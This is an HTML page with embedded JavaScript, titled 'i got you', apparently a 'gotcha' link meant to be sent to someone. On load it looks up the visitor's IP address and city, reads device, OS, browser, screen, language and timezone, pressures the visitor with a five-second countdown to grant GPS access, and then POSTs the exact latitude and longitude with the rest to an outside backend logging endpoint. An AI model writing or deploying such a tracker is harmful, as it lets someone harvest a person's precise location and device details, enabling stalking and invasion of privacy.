<!DOCTYPE html>
<html>
<head>
  <title>i got you</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      background-color: black;
      color: white;
      font-family: monospace;
      font-size: 1em;
      padding: 2em;
      line-height: 1.6em;
    }

    h1 {
      font-size: 3em;
      text-align: center;
      margin-bottom: 1em;
    }

    #fade {
      opacity: 0;
      transition: opacity 2s ease-in;
      text-align: center;
      font-size: 1.2em;
      margin-bottom: 2em;
    }

    #countdown {
      text-align: center;
      font-size: 1.5em;
      color: red;
    }
  </style>
</head>
<body>
  <h1>i got you</h1>
  <div id="fade">This location will be logged.</div>
  <div id="countdown">You have 5 seconds to allow access...</div>
  <pre id="info">Loading...</pre>

  <script>
    const fadeEl = document.getElementById("fade");
    const countdownEl = document.getElementById("countdown");
    const infoEl = document.getElementById("info");

    setTimeout(() => {
      fadeEl.style.opacity = 1;
    }, 500);

    let seconds = 5;
    const interval = setInterval(() => {
      seconds--;
      countdownEl.textContent = `You have ${seconds} second${seconds !== 1 ? "s" : ""} to allow access...`;
      if (seconds <= 0) {
        clearInterval(interval);
        countdownEl.textContent = "Requesting location...";
        requestLocation();
      }
    }, 1000);

    async function requestLocation() {
      let output = "";
      let data = {};

      try {
        const res = await fetch("https://api.db-ip.com/v2/free/self");
        data = await res.json();
        output += `IP Address: ${data.ipAddress}\n`;
        output += `Location (IP): ${data.city || "?"}, ${data.stateProv || "?"}, ${data.countryName || "?"}\n\n`;
      } catch {
        output += "IP/Location: Failed to load\n\n";
      }

      const ua = navigator.userAgent;
      const isMobile = /Mobi|Android/i.test(ua);
      const os = navigator.platform || "Unknown";
      const browser = navigator.userAgentData?.brands?.[1]?.brand || "Unknown";

      output += `Device: ${isMobile ? "Mobile" : "Desktop"}\n`;
      output += `OS: ${os}\n`;
      output += `Browser: ${browser}\n\n`;
      output += `Screen Size: ${window.screen.width}x${window.screen.height}\n`;
      output += `Language: ${navigator.language}\n`;
      output += `Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n\n`;

      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
          pos => {
            const lat = pos.coords.latitude.toFixed(5);
            const lon = pos.coords.longitude.toFixed(5);
            output += `Exact GPS:\nLatitude: ${lat}\nLongitude: ${lon}\n\n`;
            infoEl.innerText = output;

            // ✅ Send to backend
            fetch("https://gotcha-backend.onrender.com/log", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                ip: data?.ipAddress,
                city: data?.city,
                region: data?.stateProv,
                country: data?.countryName,
                device: isMobile ? "Mobile" : "Desktop",
                os: os,
                browser: browser,
                lat: lat,
                lon: lon
              })
            }).then(res => console.log("✅ Logged to backend"))
              .catch(err => console.error("❌ Failed to log:", err));
          },
          err => {
            output += `Exact GPS: Permission denied or unavailable\n\n`;
            infoEl.innerText = output;
          }
        );
      } else {
        output += `Exact GPS: Not supported\n\n`;
        infoEl.innerText = output;
      }
    }
  </script>
</body>
</html>
